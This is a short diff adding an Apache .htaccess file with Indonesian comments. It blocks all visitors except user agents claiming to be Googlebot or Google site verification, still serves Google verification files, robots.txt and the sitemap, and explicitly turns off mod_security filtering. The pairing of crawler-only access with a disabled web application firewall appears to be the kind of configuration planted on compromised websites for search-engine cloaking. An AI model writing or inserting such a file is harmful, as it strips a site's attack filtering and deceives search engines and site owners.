@@ -1,0 +1,33 @@
+Options -Indexes
+RewriteEngine On
+
+# Blokir semua akses
+Order Deny,Allow
+Deny from all
+
+# Izinkan Googlebot
+SetEnvIfNoCase User-Agent "Googlebot" allow_bot
+SetEnvIfNoCase User-Agent "Google-Site-Verification" allow_bot
+Allow from env=allow_bot
+
+# Izinkan file verifikasi Google
+<FilesMatch "^google.*\.html$">
+Order Allow,Deny
+Allow from all
+</FilesMatch>
+
+# Izinkan robots.txt dan sitemap
+<FilesMatch "^(robots\.txt|sitemap\.xml)$">
+Order Allow,Deny
+Allow from all
+</FilesMatch>
+
+# Matikan mod_security jika ada
+<IfModule mod_security.c>
+SecFilterEngine Off
+SecFilterScanPOST Off
+</IfModule>
+
+<IfModule mod_security2.c>
+SecRuleEngine Off
+</IfModule>
